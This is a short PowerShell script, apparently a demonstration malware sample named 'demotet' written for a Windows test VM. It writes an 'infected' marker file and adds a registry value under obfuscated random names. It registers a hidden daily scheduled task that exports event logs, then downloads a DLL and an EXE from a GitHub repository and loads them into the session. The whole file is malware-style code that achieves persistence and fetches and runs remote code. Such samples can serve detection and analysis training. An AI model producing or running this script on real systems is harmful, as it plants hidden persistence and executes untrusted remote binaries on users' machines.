New-Item C:\Users\IEUser\AppData\Roaming\demotet\infected.txt
Set-Content C:\Users\IEUser\AppData\Roaming\demotet\infected.txt 'You have been Infected!'

$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
$Name = "D7AD9WD56DQS89DW7DSAHDUQAI"
$value = "%USERPROFILE%\AppData\Local\DKL432BHVYUVTYF643KHJK"

IF(!(Test-Path $registryPath))

  {

    New-Item -Path $registryPath -Force | Out-Null

    New-ItemProperty -Path $registryPath -Name $name -Value $value `

    -PropertyType REG_EXPAND_SZ -Force | Out-Null}

 ELSE {

    New-ItemProperty -Path $registryPath -Name $name -Value $value `

    -PropertyType  REG_EXPAND_SZ -Force | Out-Null}
    
    
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' `

  -Argument '-NoProfile -WindowStyle Hidden -command "& {get-eventlog -logname Application -After ((get-date).AddDays(-1)) | Export-Csv -Path c:\users\IEUser\AppData\Roaming\Demotet\applog.csv -Force -NoTypeInformation}"'

$trigger =  New-ScheduledTaskTrigger -Daily -At 9am

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "DHO8DE6FDE4FE45SFD78GG" -Description "JG43KGJK834GF5KJ6"

Invoke-WebRequest -Uri https://github.com/tokio-oyama/demotet/blob/main/IK4GHD32HUHI4324UIHGFD9.dll -OutFile C:\Users\IEUser\AppData\Local\DKL432BHVYUVTYF643KHJK\IK4GHD32HUHI4324UIHGFD9.dll; 

Add-Type -Path 'C:\Users\IEUser\AppData\Local\DKL432BHVYUVTYF643KHJK\IK4GHD32HUHI4324UIHGFD9.dll'

Invoke-WebRequest -Uri https://raw.githubusercontent.com/tokio-oyama/demotet/0a114c46cfca636168536b8aea0c590b56586935/DHIUWEGHDIUWE.exe -OutFile C:\Users\IEUser\AppData\Local\DKL432BHVYUVTYF643KHJK\DHIUWEGHDIUWE.exe;

Add-Type -Path 'C:\Users\IEUser\AppData\Local\DKL432BHVYUVTYF643KHJK\DHIUWEGHDIUWE.exe'
